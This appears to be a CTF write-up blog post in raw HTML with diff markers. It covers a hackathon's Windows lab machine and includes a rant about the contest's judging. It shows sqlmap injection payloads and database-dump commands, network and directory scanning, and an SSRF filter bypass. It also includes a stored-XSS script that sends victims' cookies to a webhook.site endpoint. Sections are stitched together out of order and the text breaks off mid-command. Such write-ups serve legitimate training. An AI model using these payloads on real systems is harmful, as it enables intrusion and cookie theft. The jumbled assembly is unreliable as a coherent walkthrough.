-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[15:25:34] [INFO] testing &#39;Generic UNION query (NULL) - 1 to 20 columns&#39;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[15:25:34] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[15:25:35] [INFO] &#39;ORDER BY&#39; technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[15:25:36] [INFO] target URL appears to have 16 columns in query
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">injection not exploitable with NULL values. Do you want to try with a random integer value for option &#39;--union-char&#39;? [Y/n] n
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[15:26:09] [WARNING] if UNION based SQL injection is not detected, please consider usage of option &#39;--union-char&#39; (e.g. &#39;--union-char=1&#39;) and/or try to force the back-end DBMS (e.g. &#39;--dbms=mysql&#39;) 
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[15:26:14] [INFO] target URL appears to be UNION injectable with 16 columns
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">injection not exploitable with NULL values. Do you want to try with a random integer value for option &#39;--union-char&#39;? [Y/n] n
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[15:26:40] [INFO] checking if the injection point on URI parameter &#39;#1*&#39; is a false positive
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">URI parameter &#39;#1*&#39; is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">sqlmap identified the following injection point(s) with a total of 193 HTTP(s) requests:
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">---
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Parameter: #1* (URI)
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Type: boolean-based blind
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Title: AND boolean-based blind - WHERE or HAVING clause
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Payload: https://wp.geohome.com:443/wp-admin/admin-ajax.php?action=get_question&amp;question_id=1  AND 4443=4443
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Type: time-based blind
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Payload: https://wp.geohome.com:443/wp-admin/admin-ajax.php?action=get_question&amp;question_id=1  AND (SELECT 2743 FROM (SELECT(SLEEP(5)))iLzk)
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">---
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[15:26:45] [INFO] the back-end DBMS is MySQL
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">web server operating system: Windows 2019 or 10 or 2016
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">web application technology: PHP 8.0.0, Microsoft IIS 10.0
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">back-end DBMS: MySQL &gt;= 5.0.12
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[15:26:47] [WARNING] HTTP error codes detected during run:
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">404 (Not Found) - 46 times, 500 (Internal Server Error) - 4 times
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[15:26:47] [INFO] fetched data logged to text files under &#39;/home/cakehonolulu/.local/share/sqlmap/output/wp.geohome.com&#39;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[*] ending @ 15:26:47 /2022-05-22/</span></span></span></code></pre></div>
-</details>
-<p>We can see that it&rsquo;s both vulnerable to a boolean and a time-based SQLi; let&rsquo;s exploit that:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sqlmap -u <span style="color:#e6db74">&#34;https://wp.geohome.com/wp-admin/admin-ajax.php?action=get_question&amp;question_id=1 *&#34;</span> --dump-all</span></span></code></pre></div>
-<p>We wait for a bit and we can see that there&rsquo;s a table named &lsquo;flag&rsquo;</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>fetching tables <span style="color:#66d9ef">for</span> databases: <span style="color:#e6db74">&#39;flag, information_schema, wordpress&#39;</span></span></span></code></pre></div>
-<p>Let&rsquo;s dump that one:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sqlmap -u <span style="color:#e6db74">&#34;https://wp.geohome.com/wp-admin/admin-ajax.php?action=get_question&amp;question_id=1 *&#34;</span> --dump --code<span style="color:#f92672">=</span><span style="color:#ae81ff">200</span> --dbms<span style="color:#f92672">=</span>MySQL -D flag</span></span></code></pre></div>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">Database</span>: flag
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Table</span>: flag
-</span></span><span style="display:flex;"><span>[<span style="color:#ae81ff">1</span> entry]
-</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">-----------------------+
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">|</span> flag                  <span style="color:#f92672">|</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">-----------------------+
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">|</span> FLAG<span style="color:#960050;background-color:#1e0010">{</span>Update_Plugins<span style="color:#f92672">!</span><span style="color:#960050;background-color:#1e0010">}</span> <span style="color:#f92672">|</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">-----------------------+</span></span></span></code></pre></div>
-<p>Bingo: <code>FLAG{Update_Plugins!}</code></p>
-<h1 id="windows-exploitation">Windows Exploitation</h1>
-<br>
-Now we'll jump straight to Windows exploiting; while I was discussing the CTF with a NUWE employer, I told them that I found
+I have 0 criticism against him, he was the most supportive of all; curiously he was from NUWE and not from Schneider&mldr;).</p><p>After this convo, I found the rest of the local flags (All of them), so I told another mentor in Cybersecurity that I found them.</p><p>After 10 minutes or so, we had a team from Schneider get into our call to discuss our findings.</p><p>Here&rsquo;s where the fun started.</p><p>The mental gymnastics they were doing in order to disqualify the findings was abismal.</p><p>Their main points were:</p><p><code>You found the flags, good; but the method isn&rsquo;t the intended one.</code></p><p>Yes, and? Part of the fun from CTFs comes from finding multiple ways of defeating a challenge; be it running a strings() on a file or creating a super-complicated script that mangles the flags for you.</p><p>A few weeks ago I was @ UPC&rsquo;s Hackathon doing CTF challenges and the challenge authors approached me to discuss the unintended ways I used and we got a super nice convo discussing a lot of CTF-related topics.</p><p>After all, CTFs are defined like that because once you find the flag, you upload it in exchange of points or whatever they decide.</p><p>If you need to upload an explanation on how you found them, it&rsquo;s not a CTF.</p><p>CTFs aren&rsquo;t dictaminated by judges.</p><p>CTFs are dictaminated by your skills on developing ways to find a hidden code behind a web, a binary or whatever you want.</p><p>Flags are immutable, it doesn&rsquo;t matter if you ROP your way into a remote shell or if you use an unintended format string vuln.</p><p>This is the first time in my entire life that I participate in a Hackathon that promotes a CTF but isn&rsquo;t a CTF in reality.</p><p><code>Yeah, but flags only count 30% and writeups 70%</code></p><p>While I agree that as an organizer you have the rights to create a custom set of rules for the challenge, you can&rsquo;t introduce/modify/delete (sub)rules
+at your will as soon as you find a thing that doesn&rsquo;t fall inside your rules.</p><p>I was on different calls during the event and even some of the mentors were uninformed that this wasn&rsquo;t &ldquo;legal&rdquo; per se.</p><p>I unfortunately don&rsquo;t have screen recordings/audio proofs; but it was a shitshow, they couldn&rsquo;t even agree in a solution to the problem.</p><p>Also, 70% writeups and 30% flags?</p><p>TF is that?</p><p>This only adds subjectiveness into the judgement of a CTF.</p><p>Read the last 3 phrases again, the more you read them, the less sense they make.</p><p>This is a Judged CTF with subjective rules</p><p><img src=/images/ctfs/schneidelec/wtf.jpeg alt=WTF></p><p>What will you judge from a writeup?</p><p>Not using Comic Sans????</p><p>lmao</p><p>There were more &ldquo;arguments&rdquo; (If they can be called like so), I won&rsquo;t get into discussing them, each one they threw was worse than the previous one.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ grep -FR <span style=color:#e6db74>&#34;FLAG{&#34;</span> --exclude-dir <span style=color:#e6db74>&#34;Windows&#34;</span> --exclude-dir <span style=color:#e6db74>&#34;Program Files&#34;</span> --exclude-dir <span style=color:#e6db74>&#34;Program Files (x86)&#34;</span> 2&gt;/dev/null
+</span></span><span style=display:flex><span>FLAG<span style=color:#f92672>{</span>sanitize_input<span style=color:#f92672>}</span>
+</span></span><span style=display:flex><span>FLAG<span style=color:#f92672>{</span>Mas_uno_por_revisar_sistema<span style=color:#f92672>}</span>
+</span></span><span style=display:flex><span>FLAG<span style=color:#f92672>{</span>Buen_Password_Spraying_Eh?<span style=color:#f92672>}</span>
+</span></span><span style=display:flex><span>FLAG<span style=color:#f92672>{</span>A_su_servicio<span style=color:#f92672>}</span>
+</span></span><span style=display:flex><span>FLAG<span style=color:#f92672>{</span>Pesadilla_en_el_trabajo<span style=color:#f92672>}</span>
+</span></span><span style=display:flex><span>FLAG<span style=color:#f92672>{</span>Ay_Ay_Vigila_Tu_Puesto<span style=color:#f92672>}</span>
+</span></span><span style=display:flex><span>API_FLAG<span style=color:#f92672>{</span>Never_public_your_secret<span style=color:#f92672>}</span>
+</span></span><span style=display:flex><span>FLAG<span style=color:#f92672>{</span>SSRF_PARA_TOD@S_XD<span style=color:#f92672>}</span></span></span></code></pre></div><p>Next one was found by searching: &ldquo;Default MySQL Windows Database Location&rdquo; in DuckDuck :)</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ strings <span style=color:#e6db74>&#34;ProgramData/MySQL/MySQL Server 8.0/Data/flag/flag.ibd&#34;</span>
+</span></span><span style=display:flex><span>FLAG<span style=color:#f92672>{</span>Update_Plugins!<span style=color:#f92672>}</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ find . -name <span style=color:#e6db74>&#34;*.sql*&#34;</span> | xargs strings | grep -F <span style=color:#e6db74>&#34;FLAG{&#34;</span>
+</span></span><span style=display:flex><span>FLAG<span style=color:#f92672>{</span>Sticky_Notes_FTW<span style=color:#f92672>}</span></span></span></code></pre></div><p>In: ./Users/jenriques/AppData/Local/Packages/Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe/LocalState/plum.sqlite-wal</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ grep -R <span style=color:#e6db74>&#34;Instagram&#34;</span> Users/Public/</span></span></code></pre></div><p>We find an Instagram link, check the second photo:</p><p><img src=/images/ctfs/schneidelec/instagram.jpeg alt=Instagram></p><p><code>FLAG{El_Buen_OSINT_Naito}</code></p><p>Fuck your shitty invented rules, don&rsquo;t pretend you&rsquo;ve made a blackbox-style CTF. The moment you give us a machine to test our things one, it&rsquo;s not a blackbox anymore.</p><p>HackUPC hosted almost a 1000 members and their network was made by them.</p><p>They were university students and could do it.</p><p>You are a business and can&rsquo;t even host a exploitable CTF machine on your own.</p><p>Whatever&mldr;</p><h1 id=lets-pwn-the-shit-out-of-your-machine-then>Let&rsquo;s pwn the shit out of your machine then</h1><br><p><img src=/images/ctfs/schneidelec/ez.jpg alt=EZ></p><br><br><br><br><br><h1 id=2--their-intended-way>2.- The(ir) INTENDED way</h1><br><p><code>Flags: 2 OSINT + 4 WEB + 3 SYSTEM ( + 3 BONUS)</code><p>You&rsquo;re presented with a .ZIP file containing a VirtualBox .ova file password-protected; the password was given to us right after the initial ceremony.</p><p>Password: <code>vb8thy2feJyy6r7HTcq8e5qLHGj7ezuWrF4uEE66</code></p><p><strike>An <code>ova</code> file is nothing more than a <code>tarball</code> containing VirtualBox VM-related files (Machine
+configuration schema, SHA&rsquo;s&mldr;); plus a virtual disk image (<code>vmdk</code>).</p><p>As such, one can freely mount the image and look for things.</strike></p><p>Let&rsquo;s open the ova file; it&rsquo;ll automagically set up a VirtualBox machine for us, don&rsquo;t forget to change the network properties! (Generate random MAC addr&rsquo;s and set the internet method to bridged).</p><p><img src=/images/ctfs/schneidelec/rng_mac.gif alt=RNG_MAC></p><p>We may as well power the machine on right after, right?</p><p>We&rsquo;re greeted with a&mldr;</p><p><img src=/images/ctfs/schneidelec/cursed_win.png alt=Windows?></p><p>Windows machine? More like W̰̟ͨ̍͡i̦͉͎ͧ́n̷̲̹̓ͬd̰̜̖̦ͯ͗ͫ͡ǫ̰̬͓͑ẇ̦͎͖̺̺̗̎̂͜s̓҉̺̰̰ ̮̣́̚͟Mͯ͂̑͗͏̰̠̝̮̭͖̝a̫͚͙ͫͫͩ̀c̡̦̲̻̪̹̩̪ͪ̌̆ͮh̙͔̠̱͎̯͊̀̕ì̳̲͖̼͝ň͚̝̺͇̣̋͠e͋</p><p>Anyway, the next thing to do is find where the machine resides in our local network.</p><p>There&rsquo;s multiple ways of doing so, I personally went with the <code>arp-scan</code> way.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ sudo arp-scan --local
+</span></span><span style=display:flex><span>Interface:
+</span></span><span style=display:flex><span>Starting arp-scan 1.9.7 with <span style=color:#ae81ff>256</span> hosts <span style=color:#f92672>(</span>https://github.com/royhills/arp-scan<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>...
+</span></span><span style=display:flex><span>192.168.1.145		PCS Systemtechnik GmbH&lt;br&gt;
+</span></span><span style=display:flex><span>...
+</span></span><span style=display:flex><span><span style=color:#ae81ff>1</span> packet received by filter, <span style=color:#ae81ff>0</span> packets dropped by kernel&lt;br&gt;
+</span></span><span style=display:flex><span>Ending arp-scan 1.9.7: <span style=color:#ae81ff>256</span> hosts scanned in 1.943 seconds <span style=color:#f92672>(</span>131.76 hosts/sec<span style=color:#f92672>)</span>. <span style=color:#ae81ff>1</span> responded&lt;br&gt;&lt;/code&gt;</span></span></code></pre></div><p>Aha, we got it.</p><p>If this was a true blackbox style challenge; we&rsquo;d need to discover the target&rsquo;s operating system.</p><p>There are a lot of ways, what I tend to do is check ping&rsquo;s <code>ttl</code> value to find <i>a grosso modo</i> which OS we&rsquo;re dealing with.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ ping 192.168.1.145
+</span></span><span style=display:flex><span>PING 192.168.1.145 <span style=color:#f92672>(</span>192.168.1.145<span style=color:#f92672>)</span> 56<span style=color:#f92672>(</span>84<span style=color:#f92672>)</span> bytes of data.
+</span></span><span style=display:flex><span><span style=color:#ae81ff>64</span> bytes from 192.168.1.145: icmp_seq<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span> ttl<span style=color:#f92672>=</span><span style=color:#ae81ff>128</span> time<span style=color:#f92672>=</span>0.243 ms</span></span></code></pre></div><p>TTL=128, so we&rsquo;d know that we&rsquo;d probably be dealing with a Windows machine if we had no information relating to the machine (TTL=128, Windows; TTL=64, Linux).</p><p>While it&rsquo;s not a general rule, it tends to apply to CTF challenges, so there you have it just in case.</p><p>We&rsquo;re presented with a Windows login on the machine, but we have no credential information so it&rsquo;s a dead-end for now.</p><p>Let&rsquo;s now run a port scan targetting the machine.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ nmap -Pn -p- 192.168.1.145</span></span></code></pre></div><p>There were a lot of results so I&rsquo;ll filter out the interesting ones</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>80/tcpopen  http
+</span></span><span style=display:flex><span>443/tcp   open  https
+</span></span><span style=display:flex><span>1337/tcp  open  waste
+</span></span><span style=display:flex><span>5000/tcp  open  upnp
+</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 128.55 seconds</span></span></code></pre></div><p>Remember:</p><p><code>-Pn</code> makes nmap only do port scan</p><p><code>-p-</code> specifies all range of ports [0, UINT16_MAX]</p><p>There were WinRM, Kerberos, MySQL and LDAP ports opened too; I took note of them just in case (They can be attack vectors too).</p><p>We&rsquo;ll focus now on web exploitation, so let&rsquo;s attach http(s) ones first.</p><p>Let&rsquo;s try opening the HTTP port first on a web browser.</p><p>We&rsquo;re greeted with this:</p><p><img src=/images/ctfs/schneidelec/80.png alt=Port80></p><p>Not that much happening right here&mldr;</p><p>Let&rsquo;s get to the next one (443, HTTPs):</p><p>It&mldr; loads forever?</p><p>Looks like it&rsquo;s not responding at all or it&rsquo;s missing something; let&rsquo;s jump to the next one (1337):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>Bad Request - Invalid Hostname
+</span></span><span style=display:flex><span>HTTP Error 400. The request hostname is invalid</span></span></code></pre></div><p>It looks like we don&rsquo;t have access&mldr;</p><p>Let&rsquo;s jump to the last one (5000):</p><p>Aha! Looks like we have something!</p><p>The page returns us a <code>application/json</code> content:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{<span style=color:#f92672>&#34;text&#34;</span>:  <span style=color:#e6db74>&#34;There is nothing to see here (I guess)&#34;</span>}</span></span></code></pre></div><p>Yeah, that&rsquo;s suspicious.</p><p>Let&rsquo;s go back to the first webpage we got in.</p><p>We&rsquo;ll run a directory fuzzing scan against it, you can use any of the available tools you want; I used <code style=font-size:15.5px>ffuf</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ ffuf -c -w secret_list.txt -u http://192.168.1.145/FUZZ -e .htm,.html,.txt,.css,.js,.php
+</span></span><span style=display:flex><span> /<span style=color:#e6db74>&#39;___\  /&#39;</span>___<span style=color:#ae81ff>\ </span>  /<span style=color:#960050;background-color:#1e0010>&#39;</span>___<span style=color:#ae81ff>\ </span>  
+</span></span><span style=display:flex><span>/<span style=color:#ae81ff>\ \_</span>_/ /<span style=color:#ae81ff>\ \_</span>_/  __  __  /<span style=color:#ae81ff>\ \_</span>_/   
+</span></span><span style=display:flex><span><span style=color:#ae81ff>\ \ </span>,__<span style=color:#ae81ff>\\</span> <span style=color:#ae81ff>\ </span>,__<span style=color:#ae81ff>\/\ \/\ \ \ \ </span>,__<span style=color:#ae81ff>\ </span> 
+</span></span><span style=display:flex><span> <span style=color:#ae81ff>\ \ \_</span>/ <span style=color:#ae81ff>\ \ \_</span>/<span style=color:#ae81ff>\ \ \_\ \ \ \ \_</span>/  
+</span></span><span style=display:flex><span>  <span style=color:#ae81ff>\ \_\ </span>  <span style=color:#ae81ff>\ \_\ </span> <span style=color:#ae81ff>\ \_</span>___/  <span style=color:#ae81ff>\ \_\ </span>  
+</span></span><span style=display:flex><span>   <span style=color:#ae81ff>\/</span>_/<span style=color:#ae81ff>\/</span>_/   <span style=color:#ae81ff>\/</span>___/<span style=color:#ae81ff>\/</span>_/
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>v1.5.0-dev
+</span></span><span style=display:flex><span>________________________________________________
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>:: Method   : GET
+</span></span><span style=display:flex><span>:: URL  : http://192.168.1.145/FUZZ
+</span></span><span style=display:flex><span>:: Wordlist : FUZZ: secret_list.txt
+</span></span><span style=display:flex><span>:: Extensions   : .htm .html .txt .css .js .php
+</span></span><span style=display:flex><span>:: Follow redirects : false
+</span></span><span style=display:flex><span>:: Calibration  : false
+</span></span><span style=display:flex><span>:: Timeout  : <span style=color:#ae81ff>10</span>
+</span></span><span style=display:flex><span>:: Threads  : <span style=color:#ae81ff>40</span>
+</span></span><span style=display:flex><span>:: Matcher  : Response status: 200,204,301,302,307,401,403,405,500
+</span></span><span style=display:flex><span>________________________________________________
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>index.php   <span style=color:#f92672>[</span>Status: 200, Size: 1357, Words: 111, Lines: 37, Duration: 4ms<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>comments.txt<span style=color:#f92672>[</span>Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 2ms<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>robots.txt  <span style=color:#f92672>[</span>Status: 200, Size: 24, Words: 2, Lines: 1, Duration: 24ms<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>testsite.php<span style=color:#f92672>[</span>Status: 200, Size: 267, Words: 9, Lines: 17, Duration: 4ms<span style=color:#f92672>]</span></span></span></code></pre></div><p>Cool, ffuf found a bunch of interesting stuff.</p><p>Let&rsquo;s access index.php</p><p><img src=/images/ctfs/schneidelec/index_80.png alt=Index80></p><p>Meh, it doesn&rsquo;t look interesting</p><p>It&rsquo;s vulnerable to XSS, so there goes that.</p><p><img src=/images/ctfs/schneidelec/xss.png alt=XSS></p><p>May I add that this applet is beyond broken? While fuzzing the textbox, at some point the website just, either crashed or did something wrong.</p><p>Later, I saw that it writes the textbox contents to a file named comments.txt and reads it each time we enter to the page, effectively rendering most of our strategies to a one-time-only test before everything get&rsquo;s f*d up.</p><p>So you have to re-install the VM each time you plan an XSS strategy else it gets filled with all the previous stuff you fuzzed it with.</p><p>It looks intentional (And very unsafe too).</p><p>Basically this looks like a very powerful form of XSS called <a href=https://portswigger.net/web-security/cross-site-scripting/stored>Stored XSS</a>, everyone who visits this link will get the XSS payload delivered&mldr; This is not good for the end user
+but it&rsquo;s good for us :)</p><p>Let&rsquo;s craft an XSS payload that delivers the cookies to an endpoint (I used this exact method in HackTheBox&rsquo;s Cyber Apocalypse Web Kryptos Support Challenge, it&rsquo;s identical), webhook.site in this case</p><p>The payload I used is:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>script</span><span style=color:#f92672>&gt;</span><span style=color:#66d9ef>var</span> <span style=color:#a6e22e>xmlHttp</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>XMLHttpRequest</span>(); <span style=color:#a6e22e>xmlHttp</span>.<span style=color:#a6e22e>open</span>(<span style=color:#e6db74>&#39;GET&#39;</span>, <span style=color:#e6db74>&#39;https://webhook.site/Random_UUID/ENDPOINT?variable=&#39;</span><span style=color:#f92672>+</span>document.<span style=color:#a6e22e>cookie</span>, <span style=color:#66d9ef>false</span> ); <span style=color:#a6e22e>xmlHttp</span>.<span style=color:#a6e22e>send</span>(<span style=color:#66d9ef>null</span>)<span style=color:#f92672>&lt;</span><span style=color:#960050;background-color:#1e0010>/script&gt;</span></span></span></code></pre></div><p>Let&rsquo;s wait a bit and&mldr;</p><p><img src=/images/ctfs/schneidelec/sanitize_input.png alt=SanitizeInput></p><p>Bingo: <code>FLAG{sanitize_input}</code></p><p>Let&rsquo;s jump to our next target; testsite.php</p><p><img src=/images/ctfs/schneidelec/testsite.png alt=TestSite></p><p>Interesting&mldr; let&rsquo;s try to redirect ourselves somewhere&mldr; maybe localhost:1337 ?</p><p>The website redirects you if you input your tests, let&rsquo;s try using <code>curl</code></p><p>I inspected the request using Firefox&rsquo;s Network Page in it&rsquo;s built in Inspector, and the textbox contents get appended to an HTTP Request variable named <code>url</code> accordingly, so let&rsquo;s start doing some requests, shall we?</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ curl <span style=color:#e6db74>&#34;http://192.168.1.145/testsite.php?url=localhost&#34;</span> -w <span style=color:#e6db74>&#34;\n&#34;</span></span></span></code></pre></div><p>It returns us &ldquo;Protocolo no permitido&rdquo; (Prohibited protocol), we haven&rsquo;t <em>really</em> specified a protocol, let&rsquo;s try maybe&mldr; http?</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ curl <span style=color:#e6db74>&#34;http://192.168.1.145/testsite.php?url=http://localhost&#34;</span> -w <span style=color:#e6db74>&#34;\n&#34;</span></span></span></code></pre></div><p>Now it outputs:</p><p><code>La ruta localhost no esta permitida por razones de seguridad. Que intentas hacer? :D</code></p><p>It&rsquo;s telling us roughly that the localhost location can&rsquo;t be accessed for security reasons&mldr; is this some sort of anti-SSRF methodology?</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ curl <span style=color:#e6db74>&#34;http://192.168.1.145/testsite.php?url=http://127.0.0.1&#34;</span> -w <span style=color:#e6db74>&#34;\n&#34;</span></span></span></code></pre></div><p>This doesn&rsquo;t work, let&rsquo;s try bypassing a possible anti-SSRF protocol&mldr;</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ curl <span style=color:#e6db74>&#34;http://192.168.1.145/testsite.php?url=http://localhosT&#34;</span> -w <span style=color:#e6db74>&#34;\n&#34;</span></span></span></code></pre></div><p>This redirects us to localhost, so the anti-SSRF rule looks bypassed&mldr; Maybe let&rsquo;s try adding the ports we wrote down earlier?</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ curl <span style=color:#e6db74>&#34;http://192.168.1.145/testsite.php?url=http://localhosT:443&#34;</span> -w <span style=color:#e6db74>&#34;\n&#34;</span></span></span></code></pre></div><p>Nothing</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ curl <span style=color:#e6db74>&#34;http://192.168.1.145/testsite.php?url=http://localhosT:1337&#34;</span> -w <span style=color:#e6db74>&#34;\n&#34;</span></span></span></code></pre></div><p>Bingo: <code>FLAG{SSRF_PARA_TOD@S_XD}</code></p><p>Let&rsquo;s continue with the pwnage.</p><p>Remember the robots.txt file? Well, here are the contents:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># https://wp.geohome.com</span></span></span></code></pre></div><p>Let&rsquo;s add that to our hosts file and enter the website</p><p><img src=/images/ctfs/schneidelec/geosite.png alt=GeoSite></p><p>Good, let&rsquo;s find something in here of our interest.</p><p>We find a <a href=https://github.com/geohome-dev/>GitHub profile link</a> at the bottom of the page alongside a facebook one.</p><p>Let&rsquo;s try looking for the GitHub one&mldr; interesting, only 1 repo&mldr; let&rsquo;s access it:</p><p>Maybe enter the commits section?</p><p><img src=/images/ctfs/schneidelec/commits.png alt=Commits></p><p>Bingo: <code>FLAG{ALWAYS_CHECK_COMMITS}</code></p><p><img src=/images/ctfs/schneidelec/bwtm.jpg alt=ButWaitTheresMore></p><p><img src=/images/ctfs/schneidelec/jwt.png alt=JWT></p><p>We now have one more flag and a <em>secret</em> JSON Web Token <code>Ge0HomeIsThePlaceWhereFantasyMeetsReality</code> :)</p><p>JSON&mldr; sounds familiar&mldr; Remember when we accessed the server&rsquo;s port 5000? It returns JSON data.</p><p>Maybe something we can fuzz now that we have a JWT?</p><p>Let&rsquo;s try the default endpoints for an API (/admin, /logout, /login, /register&mldr;)</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ curl <span 